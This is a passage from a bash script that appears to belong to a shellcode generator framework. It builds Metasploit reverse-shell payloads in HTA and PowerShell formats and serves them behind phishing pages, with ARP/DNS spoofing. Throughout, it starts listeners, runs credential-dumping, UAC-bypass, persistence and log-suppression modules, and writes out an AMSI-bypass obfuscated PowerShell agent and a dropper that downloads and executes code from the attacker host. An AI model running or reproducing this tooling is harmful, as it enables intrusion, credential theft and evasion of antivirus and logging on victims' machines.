    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.bat|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.bat|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.bat|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.bat $ApAcHe/$N4m.bat > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/InvokePS1[bak].bat $InJEc8 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm -r $H0m3/.psploit > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.bat > /dev/null 2>&1
rm $IPATH/bin/sedding.raw > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# -----------------------------------------------------
# build shellcode in HTA-PSH format (windows-platforms)
# reproduction of hta powershell attack in unicorn.py
# one of my favorite methods by ReL1K :D 
# -----------------------------------------------------
sh_shellcode10 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: ReL1K" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="ReL1K";fi

echo "[☠] Building shellcode -> HTA-PSH format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : HTA-PSH -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f hta-psh > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f hta-psh > $IPATH/output/chars.raw"
fi

echo ""
# display generated shelcode
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
store=`cat $IPATH/output/chars.raw | awk {'print $7'}`
echo $store
echo "" && echo ""
# grab shellcode from chars.raw
Sh33L=`cat $IPATH/output/chars.raw | grep "powershell.exe -nop -w hidden -e" | cut -d '"' -f2`
# copy chars.raw to hta_attack dir
cp $IPATH/output/chars.raw $IPATH/templates/hta_attack/chars.raw
sleep 2


   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc6 ]; then
      echo "[☠] exec.hta -> found!"
      sleep 2
   else
      echo "[☠] exec.hta -> not found!"
      exit
   fi

   if [ -e $InJEc7 ]; then
      echo "[☠] index.html -> found!"
      sleep 2
   else
      echo "[☠] index.html -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc6 $IPATH/templates/hta_attack/mine[bak].hta
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html

cd $IPATH/templates/hta_attack
# use SED to replace NaM3 and Inj3C
echo "[☠] Injecting shellcode -> $N4m.hta!"
# replace NaM3 by $N4m (var grab by venom.sh)
sed "s|NaM3|$N4m.hta|g" index.html > copy.html
mv copy.html $IPATH/output/index.html
# replace INj3C by shellcode stored in var Sh33L in 'meu_hta-psh.hta' file
sed "s|Inj3C|$Sh33L|g" exec.hta > $N4m.hta
cp $IPATH/templates/phishing/missing_plugin.png $ApAcHe/missing_plugin.png > /dev/null 2>&1
mv $N4m.hta $IPATH/output/$N4m.hta > /dev/null 2>&1
chown $user $IPATH/output/$N4m.hta > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.hta\n$IPATH/output/index.html\n\nIf needed further encrypt your hta using:\nshell/obfuscate/hta-to-javascript-crypter.html\nbefore continue...\n\nchose how to deliver: $N4m.hta" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 300) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      zenity --title="☠ SHELLCODE GENERATOR ☠" --text "Store the 2 files in apache2 webroot and\nSend: [ http://$lhost/index.html ]\nto target machine to execute payload" --info --width 300 > /dev/null 2>&1
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi




      cd $IPATH/output
      cp $N4m.hta $ApAcHe/$N4m.hta > /dev/null 2>&1
      cp index.html $ApAcHe/index.html > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.hta|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.hta $ApAcHe/$N4m.hta
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/hta_attack/mine[bak].hta $InJEc6 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/index[bak].html $InJEc7 > /dev/null 2>&1
rm $IPATH/templates/hta_attack/chars.raw > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/output/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.hta > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/missing_plugin.png > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# --------------------------------------------------------------
# build shellcode in PS1 (windows systems)
# 'Matthew Graeber' powershell <DownloadString> technic
# --------------------------------------------------------------
sh_shellcode11 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: Graeber" --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="Graeber";fi

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PSH-CMD -> WINDOWS
    PAYLOAD : $paylo

!

#
# use metasploit to build shellcode
# HINT: use -n to add extra bits (random) of nopsled data to evade signature detection
#
KEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw" > /dev/null 2>&1
fi

# parsing shellcode data
str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo "$str0" > $IPATH/output/chars.raw


# display shellcode
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 3
echo $str0
echo "" && echo ""

# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi



cd $IPATH/output/
# compiling to ps1 output format
echo "[☠] Injecting shellcode -> $N4m.ps1!"
sleep 2
OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
if [ "$OBF" = "None-Obfuscation (default)" ]; then
echo "Write-Host \"Please Wait, installing software..\" -ForeGroundColor green;powershell.exe -nop -wind hidden -Exec Bypass -noni -enc Sh33L" > payload.raw
else
echo "[✔] String obfuscation technic sellected .."
sleep 2
echo "[☠] Building $N4m.ps1 agent .."
# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
# HINT: setting -ExecutionPolicy/-ep is redundant since -EncodedCommand/-enc automatically bypasses the execution policy
#
# STRING: powershell.exe -NoPRo -wIN 1 -nONi -eN Sh33L
echo "Write-Host \"Please Wait, installing software..\";pi\`ng -n 3 ww\`w.mi\`cro\`sof\`t.co\`m > \$env:tmp\\li\`ce\`nce.p\`em;\$method=(\"{1}{2}{0}\" -f'N','/','e');\$ScriptBlock = \"'Sy?s%t%e??m.Ma%na?geme?nt.Auto?mat?i%o%n.A?msi?U%t%i?ls'\";\$UBlock = \"'am?s%i%?In?it%F?ai?l%e%d'\";\$reg = \$ScriptBlock.Replace(\"?\",\"\").Replace(\"%\",\"\");\$off = \$UBlock.Replace(\"?\",\"\").Replace(\"%\",\"\");[ref].Assembly.GetType(\$reg).GetField(\$off, 'NonPublic,Static').SetValue(\$null,\$true);\$cert=(\"{1}{3}{0}{2}\" -f'N','/n','i','O');Pow\`ers\`hell.e\`Xe /No\`PR\`o  /wI\`N 1 \$cert \$method Sh33L" > payload.raw
fi
#
# parsing data
#
sed "s|Sh33L|$str0|" payload.raw > $N4m.ps1
rm $IPATH/output/payload.raw > /dev/null 2>&1


# build installer.bat (x86) to call .ps1
echo "[☠] Building installer.bat dropper .."
sleep 2
if [ "$OBF" = "None-Obfuscation (default)" ]; then
echo "@echo off&&powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://$lhost/$N4m.ps1')" > $IPATH/output/installer.bat
else
echo "@e%!%ch^O Of^f&&@c^Md%i%\".\"e%db%X^e ,/^R ,, =po%$'''!%W^er%,,,%She^ll.E^x%Count+3%e I%pP0%E^X (N%on%e^w-Obj^e%$,,,%ct N%i0%e^t.We^bC%A%lie^n%$'''d%t).Do%pP0%wn^loa%UI%d^Str^i%$'''E%ng('h'+'tt'+'p:'+'//'+'$lhost/$N4m.ps'+'1')" > $IPATH/output/installer.bat
fi


# CHOSE HOW TO DELIVER YOUR PAYLOAD
